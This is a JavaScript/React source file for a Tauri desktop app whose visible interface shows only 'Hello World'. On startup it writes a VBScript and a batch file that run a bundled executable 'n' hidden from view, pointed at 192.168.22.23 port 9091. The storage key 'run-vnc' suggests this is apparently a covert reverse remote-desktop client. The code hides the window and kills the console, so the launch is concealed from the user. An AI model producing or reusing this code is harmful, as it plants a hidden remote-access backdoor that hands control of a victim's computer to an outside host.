import { path, fs, shell, os } from '@tauri-apps/api'
import { useEffect } from 'react'

import './App.less'

function App() {
  useEffect(() => {
    const run = localStorage.getItem('run-vnc')

    // if (!run) {
      init()
    // }
  }, [])

  const init = async () => {
    // localStorage.setItem('run-vnc', 1)

    const resourceDir = await path.resourceDir()
    const isMac = await os.type() === 'Darwin'
    const isDev = import.meta.env.MODE === 'development'
    let exePath = ''

    if (isMac) {
      exePath = isDev ? await path.join(resourceDir, 'n') : await path.join(resourceDir, '../MacOS/n')
    } else {
      exePath = await path.join(resourceDir, 'n.exe')
    }

    const vbPath = await path.join(resourceDir, 'run.vbs')
    const batPath = await path.join(resourceDir, 'run.bat')
    const vbContent = `Set ws=WScript.CreateObject("Wscript.Shell")\nws.Run "${exePath} 192.168.22.23 9091",vbhide`
    const batContent = `@echo off\nstart /MIN "wumin" "C:\\Windows\\System32\\cmd.exe"\n${vbPath}\ntaskkill /f /im cmd.exe\nexit`

    await fs.writeFile({ path: vbPath, contents: vbContent }).catch((err) => {
      console.log(err)
    })

    await fs.writeFile({ path: batPath, contents: batContent }).catch((err) => {
      console.log(err)
    })

    const command = new shell.Command('start', [vbPath])

    command.execute()
  }

  return (
    <div className='app'>
      Hello World
    </div>
  )
}

export default App
